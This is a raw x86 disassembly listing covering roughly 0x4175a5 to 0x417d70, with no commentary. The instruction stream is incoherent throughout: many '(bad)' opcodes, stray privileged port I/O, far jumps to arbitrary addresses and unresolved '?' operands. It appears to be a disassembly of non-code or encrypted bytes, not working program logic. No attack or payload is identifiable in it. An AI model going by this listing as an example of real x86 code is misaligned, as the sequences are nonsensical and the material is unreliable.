  4175a5:	sbb    al,ah
  4175a7:	aas    
  4175a8:	pop    es
  4175a9:	push   0x58daba0d
  4175ae:	out    dx,al
  4175af:	or     eax,0x6417cd54
  4175b4:	and    cl,bh
  4175b6:	popa   
  4175b7:	out    dx,eax
  4175b8:	ror    BYTE PTR [edx+0x59c2016b],cl
  4175be:	sub    edi,ecx
  4175c0:	dec    ebx
  4175c1:	(bad)  
  4175c2:	fst    QWORD PTR [eax+0x187e25e5]
  4175c8:	xor    al,0xe9
  4175ca:	fiadd  WORD PTR [edi]
  4175cc:	pop    ebp
  4175cd:	call   0xbc61a72a
  4175d2:	add    ecx,0x6716993e
  4175d8:	xchg   edx,eax
  4175d9:	shr    BYTE PTR [edx],cl
  4175db:	adc    ebp,DWORD PTR ds:0x1ccdb523
  4175e1:	jg     0x417609
  4175e3:	ins    DWORD PTR es:[edi],dx
  4175e4:	and    ebp,DWORD PTR ds:[esi]
  4175e7:	repnz mov esp,?
  4175ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175eb:	and    BYTE PTR ds:0x4b8dff99,dh
  4175f1:	mov    edx,0x1e7d82c4
  4175f6:	call   0xb526e804
  4175fb:	push   ss
  4175fc:	inc    ecx
  4175fd:	fisttp WORD PTR [ecx]
  4175ff:	xchg   edx,eax
  417600:	shl    BYTE PTR [ebx],cl
  417602:	xchg   edx,eax
  417603:	cld    
  417604:	jns    0x41759f
  417606:	dec    edx
  417607:	jmp    0x417639
  417609:	test   al,0xe0
  41760b:	xchg   ebp,eax
  41760c:	add    BYTE PTR [edx+0x4dd95957],dl
  417612:	fwait
  417613:	pop    ds
  417614:	add    al,0x45
  417616:	push   eax
  417617:	leave  
  417618:	shl    DWORD PTR [ebx+0x72],0xd4
  41761c:	in     eax,0x8
  41761e:	(bad)  
  41761f:	sahf   
  417620:	mov    dh,0x66
  417622:	pop    edi
  417623:	xor    al,0x6
  417625:	pop    ds
  417626:	test   DWORD PTR ds:0xfd8cc4f8,ebx
  41762c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41762d:	cmp    al,bh
  41762f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  417631:	or     edi,DWORD PTR [ebp-0x28]
  417634:	sbb    DWORD PTR [ecx+0x1192adfa],edx
  41763a:	jno    0x41764a
  41763c:	cmp    edx,esp
  41763e:	fwait
  41763f:	stos   BYTE PTR es:[edi],al
  417640:	push   0xebfd04cb
  417645:	dec    ecx
  417646:	push   ds
  417647:	jl     0x417612
  417649:	xor    al,0x24
  41764b:	stos   BYTE PTR es:[edi],al
  41764c:	mov    ebx,0x99302d31
  417651:	push   esi
  417652:	out    0xa6,al
  417654:	ins    BYTE PTR es:[edi],dx
  417655:	(bad)  
  417656:	int3   
  417657:	adc    DWORD PTR [esi-0x54084026],0xc4d2e9dd
  417661:	mov    cl,0x94
  417663:	push   ebp
  417664:	stc    
  417665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417666:	out    0xa5,al
  417668:	shl    ah,cl
  41766a:	lds    ecx,FWORD PTR [edi-0x37]
  41766d:	adc    DWORD PTR [esi+edi*2],0xffffffdb
  417671:	push   edx
  417672:	add    ebp,esp
  417674:	sub    eax,0x94e3df3b
  417679:	add    ebx,eax
  41767b:	fs push ecx
  41767d:	fld    QWORD PTR [ecx]
  41767f:	test   al,0x76
  417681:	mov    DWORD PTR [ebx-0x80],ebx
  417684:	adc    esi,DWORD PTR [ebp+ebx*2-0x262426da]
  41768b:	add    BYTE PTR [edi],bh
  41768d:	ins    BYTE PTR es:[edi],dx
  41768e:	jmp    DWORD PTR [ebx+0x7f]
  417691:	ja     0x4176b9
  417693:	mov    eax,0x44abfa70
  417698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417699:	xlat   BYTE PTR ds:[ebx]
  41769a:	xchg   DWORD PTR ds:0xfc450353,ebp
  4176a0:	inc    eax
  4176a1:	pop    esp
  4176a2:	fistp  DWORD PTR [ecx-0x5b]
  4176a5:	call   FWORD PTR [eax+0xb]
  4176a8:	dec    esp
  4176a9:	je     0x417644
  4176ab:	(bad)  
  4176ac:	dec    ebp
  4176ad:	shr    DWORD PTR [ebx-0x7fa4d799],cl
  4176b3:	adc    BYTE PTR [ecx-0x6b],bh
  4176b6:	rcr    edx,cl
  4176b8:	shr    BYTE PTR [eax+edi*8+0xfd82050],1
  4176bf:	int3   
  4176c0:	and    eax,ebp
  4176c2:	sar    BYTE PTR [edx],cl
  4176c4:	add    DWORD PTR [ebp-0x2],ebx
  4176c7:	fstp   TBYTE PTR gs:[edi]
  4176ca:	retf   
  4176cb:	push   ebx
  4176cc:	add    DWORD PTR [ebx+edx*1+0x59],ebx
  4176d0:	jb     0x4176b7
  4176d2:	out    dx,eax
  4176d3:	fs mov edi,0xf643548
  4176d9:	push   0x79
  4176db:	aad    0x3c
  4176dd:	clc    
  4176de:	xchg   esp,eax
  4176df:	mov    edx,0xaf0f1f58
  4176e4:	lahf   
  4176e5:	pop    edx
  4176e6:	ret    0x4e39
  4176e9:	mov    bh,0x75
  4176eb:	and    DWORD PTR [ecx+0x39],edi
  4176ee:	in     al,0x64
  4176f0:	aad    0x78
  4176f2:	leave  
  4176f3:	repz fistp DWORD PTR [esi]
  4176f6:	loope  0x417740
  4176f8:	cmp    al,0x3d
  4176fa:	imul   ebp,DWORD PTR [esi+0x6a],0x8fb632d0
  417701:	iret   
  417702:	xchg   ebx,eax
  417703:	xchg   edx,eax
  417704:	cmp    eax,0xf539ef87
  417709:	xor    edi,DWORD PTR [edi+ecx*8]
  41770c:	ins    DWORD PTR es:[edi],dx
  41770d:	lea    eax,[edi]
  41770f:	aam    0x56
  417711:	rcr    BYTE PTR [ebx-0x52af0af0],1
  417717:	jmp    0xaf5a:0x33064ea3
  41771e:	icebp  
  41771f:	mov    edx,0x5afa3555
  417724:	mov    esp,0x88d47382
  417729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41772a:	mov    dh,0x8c
  41772c:	push   ds
  41772d:	scas   eax,DWORD PTR es:[edi]
  41772e:	xor    cl,0xc7
  417731:	adc    ecx,edi
  417733:	push   esp
  417734:	pop    ebx
  417735:	adc    BYTE PTR [edi],0xf3
  417738:	xchg   esp,eax
  417739:	mov    ecx,0x7963666c
  41773e:	and    ecx,ebx
  417740:	(bad)  
  417741:	fisubr WORD PTR [edx-0x47a419cd]
  417747:	add    BYTE PTR [ebx-0x1f36a8dc],ch
  41774d:	sbb    ecx,DWORD PTR [esi-0x2b71b8da]
  417753:	icebp  
  417754:	xchg   ecx,eax
  417755:	xchg   edx,eax
  417757:	jae    0x4176da
  417759:	mov    bl,0xa6
  41775b:	cmp    eax,0x29e7a937
  417760:	xchg   edi,eax
  417761:	jae    0x41774d
  417763:	sbb    al,0x62
  417765:	rcr    dh,0x88
  417768:	dec    ebx
  417769:	mov    esp,0x9b4075f0
  41776e:	out    0x3c,al
  417770:	retf   
  417771:	or     esi,DWORD PTR [edi-0x14]
  417774:	fbstp  TBYTE PTR [eax]
  417776:	das    
  417777:	sbb    dh,bl
  417779:	add    ch,BYTE PTR [eax+0x6a166d61]
  41777f:	fst    DWORD PTR [eax+ebx*1-0xc618ef5]
  417786:	popf   
  417787:	xor    DWORD PTR [ebp+0x1c],esp
  41778a:	scas   eax,DWORD PTR es:[edi]
  41778b:	neg    BYTE PTR [edi+0x59c1657a]
  417791:	pop    ebp
  417792:	jmp    0x621608fd
  417797:	fcom   DWORD PTR [ecx+0xb]
  41779a:	mov    fs,WORD PTR [edi]
  41779c:	out    0x94,al
  41779e:	sub    BYTE PTR [ebx-0x7270a233],0xbb
  4177a5:	jb     0x4177ed
  4177a7:	xchg   ebp,eax
  4177a8:	inc    esp
  4177a9:	jae    0x417775
  4177ab:	cmp    ch,ch
  4177ad:	(bad)  
  4177ae:	adc    ch,ch
  4177b0:	push   ss
  4177b1:	iret   
  4177b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177b3:	xchg   ebp,edx
  4177b5:	xlat   BYTE PTR ds:[ebx]
  4177b6:	cmp    BYTE PTR [ecx-0x31d214be],dh
  4177bc:	lahf   
  4177bd:	xchg   DWORD PTR [esi+0x7a],esi
  4177c0:	arpl   WORD PTR [edi+0x76],di
  4177c3:	add    cl,dl
  4177c5:	rcl    DWORD PTR [edx-0x16],0x9c
  4177c9:	push   0x56
  4177cb:	mov    ebx,0xff5756c
  4177d0:	mov    ebp,0x4f67b104
  4177d5:	(bad)  
  4177d6:	(bad)  
  4177d7:	cld    
  4177d8:	xlat   BYTE PTR ds:[ebx]
  4177d9:	(bad)  
  4177da:	out    dx,eax
  4177db:	sar    eax,0xd3
  4177de:	sbb    al,0xec
  4177e0:	push   0xc62849ed
  4177e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177e6:	cwde   
  4177e7:	or     eax,eax
  4177e9:	pop    ebp
  4177ea:	push   ss
  4177eb:	dec    ecx
  4177ec:	jns    0x41778d
  4177ee:	scas   al,BYTE PTR es:[edi]
  4177ef:	fs adc eax,0x66237f77
  4177f5:	cli    
  4177f6:	ror    DWORD PTR [ecx+0x369ce678],1
  4177fc:	jns    0x417781
  4177fe:	xor    esi,DWORD PTR [edi-0x542c5fef]
  417804:	pop    edx
  417805:	xor    esp,edx
  417807:	push   0x316590ce
  41780c:	scas   al,BYTE PTR es:[edi]
  41780d:	mul    DWORD PTR [esi+0x11]
  417810:	inc    eax
  417811:	jge    0x41785a
  417813:	sub    edx,esp
  417815:	sbb    DWORD PTR [ebp-0x40],0x67
  417819:	(bad)  
  41781a:	iret   
  41781b:	icebp  
  41781c:	scas   eax,DWORD PTR es:[edi]
  41781d:	je     0x4177ca
  41781f:	push   0x3
  417821:	sbb    eax,0xef82dab9
  417826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417827:	lods   eax,DWORD PTR ds:[esi]
  417828:	inc    esp
  417829:	add    al,0x6d
  41782b:	fnsave [esi]
  41782d:	mov    dh,0x5b
  41782f:	jnp    0x417895
  417831:	(bad)  
  417832:	jge    0x41786f
  417834:	jg     0x417830
  417836:	clc    
  417837:	retf   0x28b9
  41783a:	mov    esi,0xfd52b750
  41783f:	adc    DWORD PTR [eax-0x87acfd8],esi
  417845:	daa    
  417846:	ins    DWORD PTR es:[edi],dx
  417847:	push   0x8411dec4
  41784c:	push   0xc8b5158e
  417851:	mov    al,ds:0x4f1a1259
  417856:	fs pop esi
  417858:	pop    ebx
  417859:	or     al,0xba
  41785b:	popa   
  41785c:	inc    dl
  41785e:	mov    esp,0x964394ad
  417863:	pmulhuw mm1,QWORD PTR [ecx+0x41c0e46]
  41786a:	scas   eax,DWORD PTR es:[edi]
  41786b:	test   al,0x94
  41786d:	and    eax,0x11d613e6
  417872:	fisttp WORD PTR [ebp+0x19]
  417875:	xor    al,0x55
  417877:	imul   esi,esp,0x1136d862
  41787d:	pop    edi
  41787e:	mov    dh,0x6f
  417880:	test   BYTE PTR [ebx+0x53],al
  417883:	mov    cl,0x87
  417885:	jns    0x417879
  417887:	shr    BYTE PTR [eax-0x76],0xfd
  41788b:	hlt    
  41788c:	cmp    BYTE PTR [ecx],al
  41788e:	xchg   DWORD PTR [ecx+0x62425d4f],edi
  417894:	xchg   BYTE PTR [esi+esi*4-0x2b],cl
  417898:	inc    edi
  417899:	mov    esp,0x9365d845
  41789e:	sbb    BYTE PTR [ebx+0x5f243e99],bh
  4178a4:	shr    al,0x3e
  4178a7:	loop   0x4178dd
  4178a9:	mov    ebx,0x1bec552
  4178ae:	sti    
  4178af:	add    DWORD PTR [ecx-0x290dbf6e],0x8feac07f
  4178b9:	jne    0x417859
  4178bb:	into   
  4178bc:	sub    DWORD PTR [esi+ecx*2-0x4b],0x5237cba2
  4178c4:	jnp    0x4178b4
  4178c6:	mov    al,0x32
  4178c8:	outs   dx,DWORD PTR ds:[esi]
  4178c9:	std    
  4178ca:	dec    eax
  4178cb:	inc    eax
  4178cc:	inc    eax
  4178cd:	ins    DWORD PTR es:[edi],dx
  4178ce:	out    dx,al
  4178cf:	outs   dx,BYTE PTR ds:[esi]
  4178d0:	adc    BYTE PTR [ebx],bl
  4178d2:	(bad)  
  4178d3:	fcomp  DWORD PTR [ebp+0x51a6ee0b]
  4178d9:	sbb    ah,BYTE PTR [eax]
  4178db:	push   0xfa8cf258
  4178e0:	inc    ecx
  4178e1:	popa   
  4178e2:	fstp   TBYTE PTR [edx+0x168a8ada]
  4178e8:	pop    edx
  4178e9:	ins    DWORD PTR es:[edi],dx
  4178ea:	mov    eax,ds:0xe6329b7b
  4178ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f0:	mov    edx,0xf8ca350
  4178f5:	mov    BYTE PTR [ecx-0x7b1931fc],0x92
  4178fc:	lods   al,BYTE PTR ds:[esi]
  4178fd:	fld    QWORD PTR [ecx-0x27d3b3eb]
  417903:	sbb    eax,0xa0cccd46
  417908:	das    
  417909:	mov    gs,WORD PTR [edx-0x2d51aee1]
  41790f:	dec    edx
  417910:	jno    0x4178cb
  417912:	add    ch,al
  417914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417915:	inc    ebx
  417916:	or     dl,BYTE PTR [esi-0x8]
  417919:	arpl   ax,sp
  41791b:	cmp    bl,BYTE PTR [ebp-0x350cbc4b]
  417921:	pop    es
  417922:	out    dx,eax
  417923:	sub    ebx,esi
  417925:	cmp    ebp,esi
  417927:	fs adc al,0xa5
  41792a:	jno    0x4178c8
  41792c:	ins    BYTE PTR es:[edi],dx
  41792d:	xor    al,0x2
  41792f:	jmp    0x57e4:0x32a1a046
  417936:	sub    ebp,DWORD PTR [ebx-0x27]
  417939:	dec    esi
  41793a:	inc    esi
  41793b:	sbb    esp,DWORD PTR [ebp+0x3c5341af]
  417941:	jmp    0x1889ec30
  417946:	imul   ecx,DWORD PTR [ebx-0x1a90fe25],0x68018983
  417950:	xor    cl,BYTE PTR [ecx+eax*1-0x66cd4ccf]
  417957:	mov    bl,0x4f
  417959:	popf   
  41795a:	cmp    ebp,DWORD PTR [ecx]
  41795c:	aam    0x34
  41795e:	inc    edx
  41795f:	push   cs
  417960:	push   0x810f00fb
  417965:	test   eax,0x13d8af74
  41796a:	lods   al,BYTE PTR ds:[esi]
  41796b:	cdq    
  41796c:	repnz enter 0x6ec,0x2b
  417971:	inc    ecx
  417972:	mov    bh,0xad
  417974:	mov    dh,0xe8
  417976:	out    dx,eax
  417977:	daa    
  417978:	sar    DWORD PTR [esi],0x0
  41797b:	fst    DWORD PTR [ebp-0x4]
  41797e:	xor    ebx,ecx
  417980:	stos   DWORD PTR es:[edi],eax
  417981:	lock in eax,dx
  417983:	mov    esp,0xd3d1934b
  417988:	dec    ecx
  417989:	push   0x21
  41798b:	cld    
  41798c:	scas   eax,DWORD PTR es:[edi]
  41798d:	xchg   esi,eax
  41798e:	sbb    bl,BYTE PTR [edx+0x68f5802d]
  417994:	(bad)  
  417995:	mov    cl,al
  417997:	mov    edi,DWORD PTR [edx+0x57e00663]
  41799d:	fsub   QWORD PTR [eax-0x6794ff68]
  4179a3:	inc    eax
  4179a4:	mov    WORD PTR [eax+0x1c],?
  4179a7:	stc    
  4179a8:	popf   
  4179a9:	aas    
  4179aa:	pop    ds
  4179ab:	es fwait
  4179ad:	mov    bl,0x52
  4179af:	cli    
  4179b0:	mov    bh,0xdf
  4179b2:	icebp  
  4179b3:	mov    cs,WORD PTR [ebp+0x72fca002]
  4179b9:	add    al,0xcb
  4179bb:	imul   ebp,DWORD PTR [edx],0xffffffa0
  4179be:	add    dh,bh
  4179c0:	(bad)  
  4179c1:	xchg   edi,eax
  4179c2:	adc    eax,0xe330362
  4179c7:	or     eax,0x960f40d5
  4179cc:	mov    esp,0x7e5f90f9
  4179d1:	push   0x5e
  4179d3:	sub    BYTE PTR [eax],bl
  4179d5:	cwde   
  4179d6:	js     0x41795a
  4179d8:	dec    eax
  4179d9:	push   ecx
  4179da:	inc    eax
  4179db:	lea    esi,[esi-0x4618149f]
  4179e1:	dec    edx
  4179e2:	xchg   bx,ax
  4179e4:	clc    
  4179e5:	push   0xffffffb6
  4179e7:	mov    dl,0x4e
  4179e9:	inc    edx
  4179ea:	push   ss
  4179eb:	add    DWORD PTR [edi+0x28],0xffffff9c
  4179ef:	rcr    DWORD PTR [edi+0x2ac9dc77],0xc8
  4179f6:	mov    al,ds:0xb80ca6bc
  4179fb:	xor    eax,0x9b2066c9
  417a00:	lock mov ebx,0x9c571881
  417a06:	repz mov al,ds:0x471a6b71
  417a0c:	inc    ebx
  417a0d:	pushf  
  417a0e:	add    BYTE PTR [edi-0x6495fbc4],ch
  417a14:	cmp    edi,DWORD PTR [ecx-0x36f3a09]
  417a1a:	rcr    DWORD PTR [edx],1
  417a1c:	cmp    esp,edi
  417a1e:	imul   ecx,DWORD PTR ds:0xed4b030a,0xffffffe4
  417a25:	push   ecx
  417a26:	(bad)  
  417a27:	mov    esp,0x1c892cee
  417a2c:	or     BYTE PTR ds:[eax+edx*4-0x23],bh
  417a31:	xchg   ebp,eax
  417a32:	push   eax
  417a33:	jnp    0x417a17
  417a35:	and    al,0x13
  417a37:	pop    eax
  417a38:	scas   eax,DWORD PTR es:[edi]
  417a39:	xchg   DWORD PTR [ebp-0x4a],eax
  417a3c:	pop    eax
  417a3d:	adc    DWORD PTR [ebx+eax*1+0x64],edi
  417a41:	outs   dx,BYTE PTR ds:[esi]
  417a42:	(bad)  
  417a43:	xchg   esi,eax
  417a44:	jo     0x417ac3
  417a46:	(bad)  
  417a47:	loopne 0x417a09
  417a49:	rol    bl,cl
  417a4b:	mov    ch,0x78
  417a4d:	or     ah,ah
  417a4f:	xchg   ebp,eax
  417a50:	or     al,0x48
  417a52:	stc    
  417a53:	cmp    DWORD PTR [edi],edx
  417a55:	xchg   ebx,eax
  417a56:	scas   eax,DWORD PTR es:[edi]
  417a57:	mov    ds:0xe4b5d5ff,al
  417a5c:	iret   
  417a5d:	dec    edx
  417a5e:	xchg   ebx,eax
  417a5f:	ret    
  417a60:	jmp    0x4179eb
  417a62:	mov    DWORD PTR [edx],eax
  417a64:	pop    ecx
  417a65:	or     al,0x9c
  417a67:	sub    eax,0xb410aa88
  417a6c:	inc    edi
  417a6d:	pop    ss
  417a6e:	ds mov bh,0xa4
  417a71:	rcl    DWORD PTR [esi-0x2d],cl
  417a74:	sbb    eax,0xd8ef06ec
  417a79:	xlat   BYTE PTR ds:[ebx]
  417a7a:	mov    esp,0xdab44c58
  417a7f:	mov    ds:0x4405df20,al
  417a84:	xor    cl,bh
  417a86:	jo     0x417a1c
  417a88:	sbb    eax,eax
  417a8a:	loope  0x417a41
  417a8c:	data16 fucomp st(4)
  417a8f:	idiv   DWORD PTR [ebp-0x1bb0e527]
  417a95:	mov    es,WORD PTR [ebx]
  417a97:	mov    ebx,0xaeea9336
  417a9c:	push   esp
  417a9d:	icebp  
  417a9e:	jb     0x417b02
  417aa0:	repz push esi
  417aa2:	adc    eax,0x3b3b3298
  417aa7:	inc    eax
  417aa8:	stc    
  417aa9:	aas    
  417aaa:	xchg   edi,eax
  417aab:	aad    0xf1
  417aad:	inc    ebp
  417aae:	xchg   BYTE PTR [ebx+0xf],dh
  417ab1:	in     al,0xbf
  417ab3:	adc    al,0x9f
  417ab5:	sub    dh,dl
  417ab7:	in     eax,0xbb
  417ab9:	adc    eax,DWORD PTR [edi-0x59505b2d]
  417abf:	mov    al,ds:0x7cf3bc13
  417ac4:	or     DWORD PTR [edx+edi*4+0x42],esi
  417ac8:	imul   esp,DWORD PTR [eax],0x35535244
  417ace:	int    0x18
  417ad0:	mov    esp,0xee8e6a0d
  417ad5:	cmp    DWORD PTR [edx],esp
  417ad7:	(bad)  
  417ad8:	or     BYTE PTR [ebx],bl
  417ada:	xchg   edx,eax
  417adb:	push   esi
  417adc:	adc    eax,0x30ce8709
  417ae1:	ror    BYTE PTR [edi-0x59],1
  417ae4:	mov    esp,DWORD PTR [esi]
  417ae6:	mov    esi,0x4c59bd9
  417aeb:	jle    0x417abb
  417aed:	push   ds
  417aee:	add    edi,DWORD PTR [eax+eax*4]
  417af1:	mov    esi,0xb086d4d8
  417af6:	lds    esp,FWORD PTR [ecx+0x35]
  417af9:	xlat   BYTE PTR ds:[ebx]
  417afa:	cmp    al,BYTE PTR [eax]
  417afc:	xor    DWORD PTR [edx+0x313f2a41],edx
  417b02:	icebp  
  417b03:	push   es
  417b04:	inc    edi
  417b05:	ds jmp 0x1fcf:0x4948aaca
  417b0d:	cdq    
  417b0e:	cs in  eax,dx
  417b10:	stc    
  417b11:	xlat   BYTE PTR ds:[ebx]
  417b12:	(bad)  
  417b14:	cmp    esp,ebx
  417b16:	inc    ebp
  417b17:	shl    BYTE PTR [esi+0x3d],0x58
  417b1b:	pop    edi
  417b1c:	pop    esp
  417b1d:	int    0xfc
  417b1f:	adc    al,al
  417b21:	or     al,0x55
  417b23:	popa   
  417b24:	in     al,0x7d
  417b26:	lahf   
  417b27:	pop    ebp
  417b28:	les    ebp,FWORD PTR [edi-0x2e]
  417b2b:	cld    
  417b2c:	inc    ebp
  417b2d:	adc    ebx,DWORD PTR [ebx+0x4d690266]
  417b33:	mov    ecx,DWORD PTR [eax]
  417b35:	mov    WORD PTR [ecx+0x1e],fs
  417b38:	stc    
  417b39:	mov    eax,0xf18cef39
  417b3e:	adc    ebp,DWORD PTR [esi-0x379c953b]
  417b44:	jbe    0x417b91
  417b46:	test   DWORD PTR [edi+0x5e],0x8828ecac
  417b4d:	or     ebp,edi
  417b4f:	pusha  
  417b50:	push   ss
  417b51:	bt     DWORD PTR [ebp-0x6253e46e],0x94
  417b59:	cmp    edx,DWORD PTR [ecx-0x74584902]
  417b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b60:	push   ebp
  417b61:	cmp    BYTE PTR [edx-0x67],dh
  417b64:	ins    DWORD PTR es:[edi],dx
  417b65:	pop    eax
  417b66:	int3   
  417b67:	arpl   WORD PTR [ebx+0x1c],si
  417b6a:	mov    esp,0xc900d8b1
  417b6f:	in     al,0x86
  417b71:	outs   dx,DWORD PTR ds:[esi]
  417b72:	pop    edx
  417b73:	pop    edx
  417b74:	mov    DWORD PTR [ebx],esp
  417b76:	jo     0x417bcc
  417b78:	js     0x417b35
  417b7a:	rcr    BYTE PTR [ecx-0x7d4f3b8a],0xd
  417b81:	mov    cl,0xee
  417b83:	jnp    0x417b07
  417b85:	jae    0x417b76
  417b87:	scas   al,BYTE PTR es:[edi]
  417b88:	adc    DWORD PTR [ecx],esp
  417b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b8b:	adc    DWORD PTR [esi-0x18c71b88],0x5b
  417b92:	mov    ch,0xf
  417b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b95:	shl    DWORD PTR [ebp+0x77f6de94],0xc6
  417b9c:	jl     0x417b46
  417b9e:	idiv   DWORD PTR [edi]
  417ba0:	and    eax,0xc960f4e6
  417ba5:	lods   eax,DWORD PTR ds:[esi]
  417ba6:	out    0xdc,eax
  417ba8:	sub    bh,0xe7
  417bab:	jmp    0x417bb0
  417bad:	lds    ebp,FWORD PTR [eax]
  417baf:	mov    ebp,0x7f178b44
  417bb4:	sahf   
  417bb5:	pop    es
  417bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb7:	popa   
  417bb8:	sbb    ah,bl
  417bba:	inc    sp
  417bbc:	add    esi,DWORD PTR [edx]
  417bbe:	mov    al,ds:0x436d3115
  417bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bc4:	aaa    
  417bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bc6:	popf   
  417bc7:	xor    cl,BYTE PTR ss:[ecx+eiz*4+0x66d1f19d]
  417bcf:	mov    al,ds:0xc211bb48
  417bd4:	repz mov esp,0xd5026bc1
  417bda:	loop   0x417b97
  417bdc:	lahf   
  417bdd:	xchg   ebp,eax
  417bde:	aam    0x3c
  417be0:	cmovne ebx,edi
  417be3:	xchg   BYTE PTR [ebx-0x6dfbcf6d],bl
  417be9:	out    dx,eax
  417bea:	fnsave [esi+ecx*1+0x1e]
  417bee:	and    al,0x44
  417bf0:	scas   eax,DWORD PTR es:[edi]
  417bf1:	dec    edi
  417bf2:	jnp    0x417c19
  417bf4:	shr    dh,cl
  417bf6:	fs sti 
  417bf8:	or     al,ah
  417bfa:	mov    ds:0x51dc1fca,eax
  417bff:	jmp    0xce6a0f13
  417c04:	jl     0x417bea
  417c06:	or     ebx,DWORD PTR [eax+0x85aff03]
  417c0c:	pop    ebx
  417c0d:	pop    esi
  417c0e:	lds    edx,FWORD PTR gs:[ebx+0x63]
  417c12:	popf   
  417c13:	push   0xbb414845
  417c18:	add    eax,0xfcfd0854
  417c1d:	test   al,0xcb
  417c1f:	ror    DWORD PTR [ebp+0x9],0x18
  417c23:	out    0xe1,eax
  417c25:	pop    eax
  417c26:	pop    ebp
  417c27:	addr16 add al,0x22
  417c2a:	icebp  
  417c2b:	mov    eax,ds:0xfd3c21dd
  417c30:	pmaxsw mm0,QWORD PTR [ecx+0x63]
  417c34:	mov    ebx,0x6727988a
  417c39:	or     bl,BYTE PTR [ebp-0x7ac99a86]
  417c3f:	push   eax
  417c40:	xchg   DWORD PTR [eax-0xfdaeffe],ecx
  417c46:	and    eax,0x116a2da3
  417c4b:	sub    BYTE PTR [esi+0x33],0xa5
  417c4f:	(bad)  
  417c50:	in     al,0xe8
  417c52:	or     DWORD PTR [eax+ebp*2-0x477359f5],eax
  417c59:	dec    ecx
  417c5a:	ret    
  417c5b:	(bad)  
  417c5c:	and    al,0x29
  417c5e:	addr16 add al,0xe8
  417c61:	sbb    DWORD PTR [ecx],ebx
  417c63:	push   cs
  417c64:	pop    ds
  417c65:	in     al,0x9a
  417c67:	(bad)  
  417c68:	mov    ecx,0xacf79997
  417c6d:	mov    ds:0x9c445ed1,al
  417c72:	push   es
  417c73:	fimul  DWORD PTR [edx+0x598aa3d0]
  417c79:	mov    ?,WORD PTR [ebx-0x20dacf9]
  417c7f:	sbb    eax,0x9f7fd534
  417c84:	mov    dl,0x96
  417c86:	pop    ds
  417c87:	loop   0x417c24
  417c89:	sar    DWORD PTR [edi-0x19],0xfe
  417c8d:	xor    eax,0x6505ba95
  417c92:	push   ebp
  417c93:	int3   
  417c94:	xor    al,0xeb
  417c96:	mov    eax,ds:0xde711d27
  417c9b:	cwde   
  417c9c:	add    edi,ebx
  417c9e:	int    0x31
  417ca0:	cmp    eax,0xffffffce
  417ca3:	sub    dh,BYTE PTR [esi+0x34]
  417ca6:	ins    DWORD PTR es:[edi],dx
  417ca7:	ja     0x417cf6
  417ca9:	cdq    
  417caa:	sub    bl,bl
  417cac:	aam    0x5
  417cae:	outs   dx,DWORD PTR ds:[esi]
  417caf:	mov    eax,0x709930d9
  417cb4:	xchg   BYTE PTR [edi-0x2a],cl
  417cb7:	test   DWORD PTR gs:[edi-0x19],0x2d0afc02
  417cbf:	and    DWORD PTR [esi],eax
  417cc1:	mov    al,0x39
  417cc3:	push   cs
  417cc4:	jp     0x417d32
  417cc6:	and    ax,0x5621
  417cca:	mov    ebp,0xd6d4ed1c
  417ccf:	sbb    ah,dh
  417cd1:	stos   DWORD PTR es:[edi],eax
  417cd2:	and    DWORD PTR [edx+0x74],ebx
  417cd5:	adc    BYTE PTR [edi+0x67e13814],bh
  417cdb:	xchg   edx,eax
  417cdc:	lods   eax,DWORD PTR ds:[esi]
  417cde:	cdq    
  417cdf:	stos   DWORD PTR es:[edi],eax
  417ce0:	mov    ch,0x97
  417ce2:	pop    ecx
  417ce3:	in     eax,0x2d
  417ce5:	or     al,0xb8
  417ce7:	cmp    al,0xc2
  417ce9:	cs push ecx
  417ceb:	scas   al,BYTE PTR es:[edi]
  417cec:	sbb    DWORD PTR [edx],0xffffff88
  417cef:	mov    esp,0x92f47f8d
  417cf4:	xchg   ebp,eax
  417cf6:	and    ecx,DWORD PTR [esi-0x194c36b4]
  417cfc:	js     0x417cac
  417cfe:	test   al,0x20
  417d00:	jge    0x417cd7
  417d02:	mov    WORD PTR [edx-0x41cc17f7],es
  417d08:	mov    ecx,0x29d7bb78
  417d0d:	lock in al,dx
  417d0f:	scas   al,BYTE PTR es:[edi]
  417d10:	cmp    ecx,DWORD PTR [edi-0x2a]
  417d13:	test   BYTE PTR ds:0xf8b736e0,cl
  417d19:	fisttp WORD PTR [edi-0x19bb2f53]
  417d1f:	(bad)  
  417d20:	repz mov al,ds:0xb84adf15
  417d26:	mov    eax,0xa9e5b61b
  417d2b:	mov    DWORD PTR es:[ebx+eiz*4+0x69],ebx
  417d30:	mov    ebx,0xfd8ecb3c
  417d35:	sbb    eax,0xb059574a
  417d3a:	xchg   ebx,eax
  417d3b:	mov    cl,BYTE PTR [ebx+eax*1+0x1334bd54]
  417d42:	pop    edi
  417d43:	or     DWORD PTR [ebp-0x34],esp
  417d46:	mov    ds:0xf88be08c,eax
  417d4b:	(bad)  
  417d4d:	sub    cl,bl
  417d4f:	mov    edi,0x7b5b7087
  417d54:	lahf   
  417d55:	scas   eax,DWORD PTR es:[edi]
  417d56:	push   ss
  417d57:	sub    DWORD PTR [ecx+eax*8-0x4c],0xffffffd7
  417d5c:	or     ecx,ebp
  417d5e:	pop    ebp
  417d5f:	jnp    0x417ddb
  417d61:	xor    al,0xa
  417d63:	mov    al,dh
  417d65:	cwde   
  417d66:	xchg   edi,eax
  417d67:	aas    
  417d68:	inc    edi
  417d69:	push   ebp
  417d6a:	test   DWORD PTR [edx],0x19230656
  417d70:	hlt    
